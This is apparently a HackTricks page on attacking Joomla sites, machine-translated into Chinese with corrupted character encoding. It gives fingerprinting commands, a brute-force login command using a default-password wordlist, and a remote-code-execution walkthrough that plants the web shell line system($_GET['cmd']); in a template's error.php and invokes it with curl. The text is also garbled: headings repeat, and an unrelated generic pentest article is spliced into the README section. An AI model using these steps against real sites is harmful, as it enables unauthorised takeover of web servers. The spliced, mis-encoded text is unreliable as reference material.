# Joomla

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨ HackTricks ä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„ PEASS æˆ–ä¸‹è½½ HackTricks çš„ PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶ [**NFTs**](https://opensea.io/collection/the-peass-family) é›†åˆ - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**æ¨ç‰¹**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘ [hacktricks ä»“åº“](https://github.com/carlospolop/hacktricks) å’Œ [hacktricks-cloud ä»“åº“](https://github.com/carlospolop/hacktricks-cloud) æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

### Joomla ç»Ÿè®¡ä¿¡æ¯

Joomla æ”¶é›†ä¸€äº›åŒ¿åçš„[ä½¿ç”¨ç»Ÿè®¡ä¿¡æ¯](https://developer.joomla.org/about/stats.html)ï¼Œä¾‹å¦‚åœ¨ Joomla å®‰è£…ä¸­ä½¿ç”¨çš„ Joomlaã€PHP å’Œæ•°æ®åº“ç‰ˆæœ¬ä»¥åŠæœåŠ¡å™¨æ“ä½œç³»ç»Ÿçš„åˆ†å¸ƒæƒ…å†µã€‚å¯ä»¥é€šè¿‡ä»–ä»¬çš„å…¬å…±[API](https://developer.joomla.org/about/stats/api.html)æŸ¥è¯¢è¿™äº›æ•°æ®ã€‚
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## æšä¸¾

### å‘ç°/è¶³è¿¹

* æ£€æŸ¥ **meta**
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
* robots.txt

---

* robots.txt

---

* robots.txt
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
* README.txt

# Joomla

Joomlaæ˜¯ä¸€ç§æµè¡Œçš„å¼€æºå†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ï¼Œå¹¿æ³›ç”¨äºæ„å»ºå’Œç®¡ç†ç½‘ç«™ã€‚åœ¨è¿›è¡ŒJoomlaç½‘ç«™æ¸—é€æµ‹è¯•æ—¶ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›æœ‰ç”¨çš„æŠ€å·§å’Œæ–¹æ³•ã€‚

## ä¿¡æ¯æ”¶é›†

åœ¨è¿›è¡ŒJoomlaæ¸—é€æµ‹è¯•ä¹‹å‰ï¼Œé¦–å…ˆéœ€è¦æ”¶é›†æœ‰å…³ç›®æ ‡ç½‘ç«™çš„ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ä¿¡æ¯æ”¶é›†æŠ€æœ¯ï¼š

- **WhoisæŸ¥è¯¢**ï¼šä½¿ç”¨Whoiså·¥å…·è·å–ç›®æ ‡ç½‘ç«™çš„æ³¨å†Œä¿¡æ¯ï¼ŒåŒ…æ‹¬åŸŸåæ‰€æœ‰è€…å’Œè”ç³»æ–¹å¼ã€‚

- **å­åŸŸåæšä¸¾**ï¼šä½¿ç”¨å·¥å…·å¦‚`Sublist3r`æˆ–`Amass`æ¥æŸ¥æ‰¾ç›®æ ‡ç½‘ç«™çš„å­åŸŸåã€‚

- **ç›®å½•æ‰«æ**ï¼šä½¿ç”¨å·¥å…·å¦‚`Dirb`æˆ–`Gobuster`æ¥æ‰«æç›®æ ‡ç½‘ç«™çš„ç›®å½•ç»“æ„ï¼Œå¯»æ‰¾å¯èƒ½å­˜åœ¨çš„æ•æ„Ÿæ–‡ä»¶æˆ–ç›®å½•ã€‚

## æ¼æ´åˆ©ç”¨

ä¸€æ—¦æ”¶é›†åˆ°ç›®æ ‡ç½‘ç«™çš„ä¿¡æ¯ï¼Œå¯ä»¥å°è¯•åˆ©ç”¨ä»¥ä¸‹æ¼æ´è¿›è¡Œæ”»å‡»ï¼š

- **SQLæ³¨å…¥**ï¼šé€šè¿‡åœ¨Joomlaçš„æœç´¢åŠŸèƒ½æˆ–ç”¨æˆ·è¾“å…¥å­—æ®µä¸­æ³¨å…¥æ¶æ„SQLä»£ç ï¼Œå¯ä»¥è·å–æ•æ„Ÿä¿¡æ¯æˆ–æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

- **æ–‡ä»¶ä¸Šä¼ æ¼æ´**ï¼šåˆ©ç”¨Joomlaä¸­å­˜åœ¨çš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå¯ä»¥ä¸Šä¼ æ¶æ„æ–‡ä»¶å¹¶æ‰§è¡Œä»»æ„ä»£ç ã€‚

- **æœªæˆæƒè®¿é—®**ï¼šå°è¯•è®¿é—®Joomlaçš„ç®¡ç†ç•Œé¢æˆ–å…¶ä»–æ•æ„Ÿé¡µé¢ï¼Œä½¿ç”¨é»˜è®¤æˆ–å¼±å¯†ç è¿›è¡Œç™»å½•ã€‚

## ææƒå’Œåæ¸—é€

ä¸€æ—¦æˆåŠŸè·å–å¯¹ç›®æ ‡ç½‘ç«™çš„è®¿é—®æƒé™ï¼Œå¯ä»¥å°è¯•è¿›è¡Œä»¥ä¸‹æ“ä½œï¼š

- **ææƒ**ï¼šæŸ¥æ‰¾Joomlaçš„å·²çŸ¥æ¼æ´æˆ–é…ç½®é”™è¯¯ï¼Œä»¥è·å–æ›´é«˜çš„æƒé™ã€‚

- **åé—¨å®‰è£…**ï¼šåœ¨ç›®æ ‡ç½‘ç«™ä¸Šå®‰è£…åé—¨ï¼Œä»¥ä¾¿åœ¨ä»¥åè®¿é—®ç½‘ç«™ã€‚

- **æ•°æ®æ³„éœ²**ï¼šæŸ¥æ‰¾ç›®æ ‡ç½‘ç«™ä¸Šå­˜å‚¨çš„æ•æ„Ÿæ•°æ®ï¼Œå¦‚ç”¨æˆ·å‡­æ®æˆ–æ•°æ®åº“å¤‡ä»½ã€‚

## é˜²å¾¡æªæ–½

ä¸ºäº†ä¿æŠ¤Joomlaç½‘ç«™å…å—æ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä»¥ä¸‹é˜²å¾¡æªæ–½ï¼š

- **åŠæ—¶æ›´æ–°**ï¼šå®šæœŸæ›´æ–°JoomlaåŠå…¶æ’ä»¶å’Œä¸»é¢˜ï¼Œä»¥ä¿®å¤å·²çŸ¥æ¼æ´ã€‚

- **å¼ºå¯†ç **ï¼šä½¿ç”¨å¼ºå¯†ç æ¥ä¿æŠ¤Joomlaçš„ç®¡ç†å‘˜è´¦æˆ·å’Œå…¶ä»–ç”¨æˆ·è´¦æˆ·ã€‚

- **è®¿é—®æ§åˆ¶**ï¼šé™åˆ¶å¯¹Joomlaç®¡ç†ç•Œé¢çš„è®¿é—®ï¼Œå¹¶ä»…å…è®¸æˆæƒç”¨æˆ·è®¿é—®æ•æ„Ÿé¡µé¢ã€‚

- **å®‰å…¨æ’ä»¶**ï¼šå®‰è£…å¹¶é…ç½®å®‰å…¨æ’ä»¶ï¼Œå¦‚`RSFirewall`æˆ–`Akeeba Admin Tools`ï¼Œä»¥å¢å¼ºJoomlaçš„å®‰å…¨æ€§ã€‚

ä»¥ä¸Šæ˜¯å…³äºJoomlaç½‘ç«™æ¸—é€æµ‹è¯•çš„ä¸€äº›åŸºæœ¬æŠ€å·§å’Œæ–¹æ³•ã€‚è¯·è®°ä½ï¼Œåœ¨è¿›è¡Œä»»ä½•æ¸—é€æµ‹è¯•æ´»åŠ¨æ—¶ï¼Œå§‹ç»ˆéµå®ˆæ³•å¾‹å’Œé“å¾·è§„èŒƒã€‚
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### ç‰ˆæœ¬

* åœ¨ **/administrator/manifests/files/joomla.xml** æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¿¡æ¯ã€‚
* åœ¨ **/language/en-GB/en-GB.xml** æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥è·å– Joomla çš„ç‰ˆæœ¬ã€‚
* åœ¨ **plugins/system/cache/cache.xml** æ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¤§è‡´çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚

### è‡ªåŠ¨åŒ–
```bash
droopescan scan joomla --url http://joomla-site.local/
```
### æš´åŠ›ç ´è§£

æ‚¨å¯ä»¥ä½¿ç”¨æ­¤[è„šæœ¬](https://github.com/ajnik/joomla-bruteforce)æ¥å°è¯•æš´åŠ›ç ´è§£ç™»å½•ã€‚
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## RCE

å¦‚æœä½ æˆåŠŸè·å–äº†**ç®¡ç†å‘˜å‡­è¯**ï¼Œä½ å¯ä»¥é€šè¿‡æ·»åŠ ä¸€æ®µ**PHPä»£ç **æ¥åœ¨å…¶ä¸­å®ç°**RCE**ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡**è‡ªå®šä¹‰**ä¸€ä¸ª**æ¨¡æ¿**æ¥å®ç°è¿™ä¸€ç‚¹ã€‚

1. åœ¨åº•éƒ¨å·¦ä¾§çš„`Configuration`ä¸‹ï¼Œ**ç‚¹å‡»**`Templates`ä»¥æ‰“å¼€æ¨¡æ¿èœå•ã€‚
2. åœ¨`Template`åˆ—æ ‡é¢˜ä¸‹ï¼Œ**ç‚¹å‡»**ä¸€ä¸ª**æ¨¡æ¿**åç§°ã€‚è®©æˆ‘ä»¬é€‰æ‹©`protostar`ã€‚è¿™å°†å¸¦æˆ‘ä»¬è¿›å…¥**`Templates: Customise`**é¡µé¢ã€‚
3. æœ€åï¼Œä½ å¯ä»¥ç‚¹å‡»ä¸€ä¸ªé¡µé¢ä»¥æŸ¥çœ‹**é¡µé¢æºä»£ç **ã€‚è®©æˆ‘ä»¬é€‰æ‹©`error.php`é¡µé¢ã€‚æˆ‘ä»¬å°†æ·»åŠ ä¸€è¡Œ**PHPä»£ç æ¥å®ç°ä»£ç æ‰§è¡Œ**ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
   ```
   system($_GET['cmd']);
   ```
4. **ä¿å­˜å¹¶å…³é—­**
5. `curl -s http://joomla-site.local/templates/protostar/error.php/error.php?cmd=id`

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½HackTricksçš„PDFå—ï¼Ÿè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
